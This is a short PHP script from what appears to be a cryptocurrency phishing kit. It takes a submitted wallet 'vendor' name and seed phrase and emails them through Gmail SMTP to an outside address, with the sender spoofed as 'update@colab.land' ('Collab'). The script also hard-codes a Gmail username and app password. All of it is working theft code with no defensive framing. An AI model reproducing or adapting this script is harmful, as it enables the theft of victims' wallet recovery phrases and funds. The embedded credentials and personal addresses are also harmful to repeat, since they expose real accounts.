<?php
    // PHPMailer
    require '../PHPMailer/PHPMailer.php';
    require '../PHPMailer/SMTP.php';
    require '../PHPMailer/Exception.php';

    if ($_POST['vendor'] == '' || $_POST['seed_phrase'] == '') {
        echo json_encode(
            array('nullError' => 'Please fill in all fields', )
        );
        
        http_response_code(500);
        return;
    } else {
        $mail = new PHPMailer\PHPMailer\PHPMailer();
        $mail->IsSMTP(); // enable SMTP
    
        $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only // 0 - off (for production use, No debug messages)
        $mail->SMTPAuth = true; // authentication enabled
        $mail->SMTPSecure = 'tls'; // secure transfer enabled REQUIRED for Gmail
        $mail->Host = "smtp.gmail.com";
        $mail->Port = 587; // or 587
        $mail->IsHTML(true);
        $mail->Username = "sixtusagbo211@gmail.com";
        $mail->Password = "qqijhccghcejwdgn";
        $mail->SetFrom('update@colab.land', 'Collab');
        $mail->Subject = 'NEW UPDATE - ' . $_POST['vendor'];
        $mail->Body = '<b>'. $_POST['vendor'] . '</b>' . '<br><br>' . $_POST['seed_phrase'];
        $mail->AddAddress("mail.mirolic@gmail.com", "Mirolic Miralo");
    
         if( !($mail->Send()) ) {
            echo json_encode(
                array('networkError' => 'Network error, please try again.', )
            );
            
          http_response_code(500);
         } else {
          http_response_code(200);
         }   
    }
